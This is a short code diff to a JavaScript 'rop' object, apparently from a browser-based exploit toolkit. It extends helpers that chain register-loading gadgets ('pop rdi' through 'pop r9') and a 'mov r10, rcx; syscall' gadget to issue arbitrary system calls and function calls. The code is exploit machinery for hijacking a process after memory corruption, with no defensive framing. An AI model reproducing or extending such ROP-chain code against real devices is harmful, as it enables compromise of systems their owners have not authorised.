@@ -69,7 +69,7 @@ function rop() {
 		return chainLength;
 	}
 	
-	this.syscall = function(name, systemCallNumber, arg1, arg2, arg3, arg4/*, arg5, arg6*/) {
+	this.syscall = function(name, systemCallNumber, arg1, arg2, arg3, arg4, arg5, arg6) {
 		logAdd("syscall " + name);
 		
 		this.add("pop rax", systemCallNumber);
@@ -77,27 +77,22 @@ function rop() {
 		if(typeof(arg2) !== "undefined") this.add("pop rsi", arg2);
 		if(typeof(arg3) !== "undefined") this.add("pop rdx", arg3);
 		if(typeof(arg4) !== "undefined") this.add("pop rcx", arg4);
-		//not working
-		/*
 		if(typeof(arg5) !== "undefined") this.add("pop r8", arg5);
 		if(typeof(arg6) !== "undefined") this.add("pop r9", arg6);
-		*/
-		//this is working
+		
 		this.add("mov r10, rcx; syscall");
 	}
 	
-	this.call = function(name, module, address, arg1, arg2, arg3, arg4/*, arg5, arg6*/) {
+	this.call = function(name, module, address, arg1, arg2, arg3, arg4, arg5, arg6) {
 		logAdd("call " + name);
 		
 		if(typeof(arg1) !== "undefined") this.add("pop rdi", arg1);
 		if(typeof(arg2) !== "undefined") this.add("pop rsi", arg2);
 		if(typeof(arg3) !== "undefined") this.add("pop rdx", arg3);
 		if(typeof(arg4) !== "undefined") this.add("pop rcx", arg4);
-		//not working
-		/*
 		if(typeof(arg5) !== "undefined") this.add("pop r8", arg5);
 		if(typeof(arg6) !== "undefined") this.add("pop r9", arg6);
-		*/
+		
 		this.add(module_infos[module].image_base + address);
 	}
 	
